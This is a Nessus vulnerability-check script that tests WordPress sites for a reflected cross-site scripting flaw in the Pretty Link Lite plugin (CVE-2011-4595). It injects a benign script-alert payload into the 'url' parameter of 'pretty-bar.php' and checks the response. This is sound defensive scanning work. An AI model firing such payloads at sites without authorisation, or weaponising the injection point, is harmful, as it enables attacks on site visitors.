#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(59387);
  script_version("$Revision: 1.4 $");
  script_cvs_date("$Date: 2015/01/16 03:36:09 $");

  script_cve_id("CVE-2011-4595");
  script_bugtraq_id(53531);
  script_osvdb_id(77582);

  script_name(english:"Pretty Link Plugin for WordPress 'pretty-bar.php' 'url' Parameter XSS");
  script_summary(english:"Attempts to inject script code via the 'url' parameter.");

  script_set_attribute(attribute:"synopsis", value:
"The remote web server hosts a PHP script that is affected by a cross-
site scripting vulnerability.");
  script_set_attribute(attribute:"description", value:
"The version of the Pretty Link Lite plugin for WordPress installed on
the remote host fails to properly sanitize user-supplied input to the
'url' parameter of the 'pretty-bar.php' script before using it to
generate dynamic HTML output. An attacker can leverage this issue to
inject arbitrary HTML and script code into a user's browser to be
executed within the security context of the affected site.

Note that the install is also reportedly affected by an additional
cross-site scripting issue as well as a SQL injection vulnerability;
however, Nessus has not tested for these.");
  script_set_attribute(attribute:"see_also", value:"http://packetstormsecurity.org/files/107551/wordpressprettylink-xss.txt");
  # http://wordpress.org/support/topic/plugin-pretty-link-lite-152-xss-vulnerability
  script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?8960c18d");
  script_set_attribute(attribute:"see_also", value:"http://wordpress.org/extend/plugins/pretty-link/changelog/");
  script_set_attribute(attribute:"solution", value:"Upgrade to Pretty Link Lite 1.5.4 or later");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:M/Au:N/C:N/I:P/A:N");
  script_set_cvss_temporal_vector("CVSS2#E:F/RL:U/RC:ND");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");
  script_cwe_id(20, 74, 79, 442, 629, 711, 712, 722, 725, 750, 751, 800, 801, 809, 811, 864, 900, 928, 931, 990);

  script_set_attribute(attribute:"vuln_publication_date", value:"2011/12/06");
  script_set_attribute(attribute:"patch_publication_date", value:"2011/12/03");
  script_set_attribute(attribute:"plugin_publication_date", value:"2012/06/06");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:wordpress:wordpress");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses : XSS");

  script_copyright(english:"This script is Copyright (C) 2012-2015 Tenable Network Security, Inc.");

  script_dependencies("wordpress_detect.nasl");
  script_require_keys("installed_sw/WordPress", "www/PHP");
  script_require_ports("Services/www", 80);

  exit(0);
}

include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("webapp_func.inc");
include("url_func.inc");

app = "WordPress";
get_install_count(app_name:app, exit_if_zero:TRUE);

port = get_http_port(default:80, php:TRUE);

install = get_single_install(
  app_name : app,
  port     : port
);

dir = install['path'];
install_url = build_url(port:port, qs:dir);

plugin = 'Pretty Link';

# Check KB first
installed = get_kb_item("www/"+port+"/webapp_ext/"+plugin+" under "+dir);

if (!installed)
{
  checks = make_array();
  path = "/wp-content/plugins/";
  checks[path + "pretty-link/includes/php/php_browsecap.ini"][0] =
    make_list('DefaultProperties', 'Version=');

  checks[path + "pretty-link/readme.txt"][0] = make_list('=== Pretty Link');

  # Ensure plugin is installed
  installed = check_webapp_ext(
    checks : checks,
    dir    : dir,
    port   : port,
    ext    : plugin
  );
}
if (!installed)
  audit(AUDIT_WEB_APP_EXT_NOT_INST, app, install_url, plugin + " plugin");

xss_test = '"><script>alert(/'+ SCRIPT_NAME + '-' + unixtime() +'/)</script>';

exploit = test_cgi_xss(
  port     : port,
  dirs     : make_list(dir),
  cgi      : '/wp-content/plugins/pretty-link/pretty-bar.php',
  qs       : 'url=' + urlencode(str:xss_test),
  pass_str : 'a href="\\' + xss_test,
  pass_re  : "You're viewing : \\"
);

if (!exploit)
  audit(AUDIT_WEB_APP_EXT_NOT_AFFECTED, app, install_url, plugin + " plugin");
